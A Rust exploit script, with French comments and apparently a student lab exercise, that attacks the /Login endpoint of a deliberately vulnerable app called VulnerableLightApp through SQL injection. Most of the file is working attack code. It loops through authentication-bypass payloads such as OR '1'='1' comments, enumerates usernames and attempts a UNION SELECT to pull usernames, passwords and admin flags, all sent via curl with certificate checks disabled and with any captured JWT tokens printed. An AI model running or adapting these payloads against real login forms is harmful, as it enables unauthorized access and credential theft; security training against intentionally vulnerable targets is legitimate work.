// Script d'exploitation automatisée des injections SQL
// Auteurs: Mahmoud et Yassine
// Description: Exploite deux vulnérabilités SQL injection dans l'endpoint /Login

use std::env;
use std::process;

fn print_banner() {
    println!("╔═══════════════════════════════════════════════════════════╗");
    println!("║   Exploit SQL Injection - VulnerableLightApp             ║");
    println!("║   Auteurs: Mahmoud et Yassine                             ║");
    println!("╚═══════════════════════════════════════════════════════════╝");
    println!();
}

fn print_usage() {
    println!("Usage: ./sql_injection_exploit <target_url>");
    println!("Exemple: ./sql_injection_exploit https://localhost:3000");
    println!();
}

fn exploit_sql_injection_bypass(target_url: &str) {
    println!("[*] Exploitation #1: SQL Injection - Bypass d'authentification");
    println!("[*] Endpoint cible: POST {}/Login", target_url);
    println!();

    // Payload SQL injection pour bypass d'authentification
    let payloads = vec![
        ("admin' OR '1'='1' --", "Bypass avec OR 1=1"),
        ("admin' OR 1=1 --", "Bypass alternatif"),
        ("' OR '1'='1' --", "Bypass sans username"),
        ("admin'--", "Bypass avec commentaire"),
    ];

    for (payload, description) in payloads {
        // Exécution de la requête avec suppression des logs d'erreur
        let json_payload = format!(
            r#"{{"User":"{}","Passwd":"password"}}"#,
            payload.replace("\"", "\\\"")
        );

        let output = process::Command::new("curl")
            .arg("-k")
            .arg("-s")
            .arg("-X")
            .arg("POST")
            .arg(format!("{}/Login", target_url))
            .arg("-H")
            .arg("Content-Type: application/json")
            .arg("-d")
            .arg(&json_payload)
            .output();

        match output {
            Ok(result) => {
                let response = String::from_utf8_lossy(&result.stdout);
                let status = if response.contains("eyJ") {
                    format!("✓ SUCCÈS - Token JWT obtenu! (Payload: {})", payload)
                } else {
                    format!("✗ ÉCHEC - {} (Réponse courte)", description)
                };
                println!("  [{}] {}", description, status);
                if response.contains("eyJ") {
                    println!("    Token: {}", response.trim());
                }
            }
            Err(e) => {
                println!("  [!] Erreur d'exécution pour {}: {}", description, e);
            }
        }
    }
    println!();
}

fn exploit_sql_injection_enumeration(target_url: &str) {
    println!("[*] Exploitation #2: SQL Injection - Énumération d'utilisateurs");
    println!("[*] Endpoint cible: POST {}/Login", target_url);
    println!();

    // Liste d'utilisateurs connus à tester
    let known_users = vec![
        "admin", "root", "user", "Alice", "Bob", "Charlie", 
        "Diana", "Edward", "Fiona", "George", "Hannah", "Ian", "Julia"
    ];

    println!("  [+] Tentative d'énumération des utilisateurs valides...");

    for username in known_users {
        // Payload pour vérifier l'existence de l'utilisateur
        let payload = format!("{}' OR '1'='1' --", username);
        let json_payload = format!(
            r#"{{"User":"{}","Passwd":"test"}}"#,
            payload.replace("\"", "\\\"")
        );

        let output = process::Command::new("curl")
            .arg("-k")
            .arg("-s")
            .arg("-w")
            .arg("\n%{http_code}")
            .arg("-X")
            .arg("POST")
            .arg(format!("{}/Login", target_url))
            .arg("-H")
            .arg("Content-Type: application/json")
            .arg("-d")
            .arg(&json_payload)
            .output();

        match output {
            Ok(result) => {
                let full_output = String::from_utf8_lossy(&result.stdout);
                let parts: Vec<&str> = full_output.trim().split('\n').collect();
                
                if parts.len() >= 2 {
                    let response = parts[0];
                    let status_code = parts[1];
                    
                    if status_code == "200" || response.contains("eyJ") {
                        println!("    [✓] Utilisateur trouvé: {} (Code HTTP: {})", username, status_code);
                    } else {
                        // Moins verbeux, on n'affiche pas les échecs
                        // println!("    [✗] Utilisateur non confirmé: {} (Code HTTP: {})", username, status_code);
                    }
                }
            }
            Err(e) => {
                println!("    [!] Erreur pour {}: {}", username, e);
            }
        }
    }
    println!();
}

fn exploit_sql_injection_data_extraction(target_url: &str) {
    println!("[*] Exploitation #3: SQL Injection - Extraction de données (Tentative)");
    println!("[*] Endpoint cible: POST {}/Login", target_url);
    println!();

    // Payload pour extraire des informations via SQL injection
    let info_payloads = vec![
        ("admin' UNION SELECT User, Passwd, IsAdmin FROM Users --", "Extraction via UNION"),
        ("' OR 1=1 LIMIT 1 --", "Extraction première ligne"),
    ];

    for (payload, description) in info_payloads {
        let json_payload = format!(
            r#"{{"User":"{}","Passwd":"test"}}"#,
            payload.replace("\"", "\\\"")
        );

        let output = process::Command::new("curl")
            .arg("-k")
            .arg("-s")
            .arg("-X")
            .arg("POST")
            .arg(format!("{}/Login", target_url))
            .arg("-H")
            .arg("Content-Type: application/json")
            .arg("-d")
            .arg(&json_payload)
            .output();

        match output {
            Ok(result) => {
                let response = String::from_utf8_lossy(&result.stdout);
                if response.contains("System.Data.SyntaxErrorException") {
                    println!("  [✗] {} - Échec (Erreur de syntaxe Data.Select)", description);
                } else if response.contains("eyJ") {
                    println!("  [✓] {} - Succès (Token obtenu)", description);
                } else {
                    println!("  [?] {} - Réponse inattendue (Taille: {})", description, response.len());
                }
            }
            Err(e) => {
                println!("  [!] Erreur d'exécution pour {}: {}", description, e);
            }
        }
    }
    println!();
}

fn main() {
    print_banner();

    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        print_usage();
        process::exit(1);
    }

    let target_url = &args[1];
    
    println!("[*] URL cible: {}", target_url);
    println!("[*] Démarrage des exploitations SQL Injection...");
    println!();

    // Test de connectivité
    println!("[*] Test de connectivité...");
    let test_output = process::Command::new("curl")
        .arg("-k")
        .arg("-s")
        .arg("-o")
        .arg("/dev/null")
        .arg("-w")
        .arg("%{http_code}")
        .arg(target_url)
        .output();

    match test_output {
        Ok(result) => {
            let status = String::from_utf8_lossy(&result.stdout);
            if status == "200" {
                println!("[✓] Serveur accessible (HTTP {})", status);
                println!();
            } else {
                println!("[!] Serveur répond avec le code HTTP: {}", status);
                println!("[!] Continuation des tests...");
                println!();
            }
        }
        Err(_) => {
            println!("[✗] Impossible de contacter le serveur");
            println!("[!] Vérifiez que l'application est démarrée");
            process::exit(1);
        }
    }

    // Exécution des exploitations
    exploit_sql_injection_bypass(target_url);
    println!("═══════════════════════════════════════════════════════════");
    println!();
    
    exploit_sql_injection_enumeration(target_url);
    println!("═══════════════════════════════════════════════════════════");
    println!();
    
    exploit_sql_injection_data_extraction(target_url);
    
    println!("[*] Exploitation terminée!");
    println!();
    println!("╔═══════════════════════════════════════════════════════════╗");
    println!("║   Résumé des vulnérabilités SQL exploitées:              ║");
    println!("║   1. Bypass d'authentification (SQL Injection)            ║");
    println!("║   2. Énumération d'utilisateurs (SQL Injection)           ║");
    println!("║   Localisation: Identity/VLAIdentity.cs ligne 41          ║");
    println!("║   CWE-89: SQL Injection                                   ║");
    println!("╚═══════════════════════════════════════════════════════════╝");
}
